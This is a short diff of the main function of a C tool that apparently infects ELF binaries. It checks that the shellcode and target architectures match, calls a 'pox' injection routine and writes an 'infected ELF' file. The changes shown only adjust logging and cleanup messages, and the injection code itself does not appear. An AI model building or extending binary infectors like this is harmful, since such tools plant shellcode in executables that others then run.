@@ -80,10 +80,9 @@ int main(int argc, char **argv){
         fprintf(stderr, "Target ELF and shellcode architecture do not match");
     }
 
-    //bool pox(const bin_t *elf, const bin_t *payload, bin_t *out, byte_t *buf_tmp, byte_t *buf_out){
     if((buf_tmp = malloc(bin_target.len)) == NULL
             || (buf_out = malloc(bin_target.len + pox_padlen(&bin_target, bin_payload.len))) == NULL){
-        printf("Failed to allocate\n");
+        fprintf(stderr, "Failed to allocate\n");
         ret = -1;
         goto cleanup;
     }
@@ -91,7 +90,7 @@ int main(int argc, char **argv){
     pox(&bin_target, &bin_payload, &bin_out, buf_tmp, buf_out);
 
     snprintf(out_path, sizeof(out_path), "%s.op8", argv[1]);
-    printf("Creating infected ELF '%s'\n", out_path);
+    fprintf(stdout, "Creating infected ELF '%s'\n", out_path);
     FILE *f = fopen(out_path, "w");
     if(!f){
         perror("Bad Thing\n");
@@ -109,7 +108,6 @@ int main(int argc, char **argv){
     fclose(f);
 
 cleanup:
-    printf("Cleaning up...\n");
     free(buf_tmp);
     free(buf_out);
     free(fbuf_target);
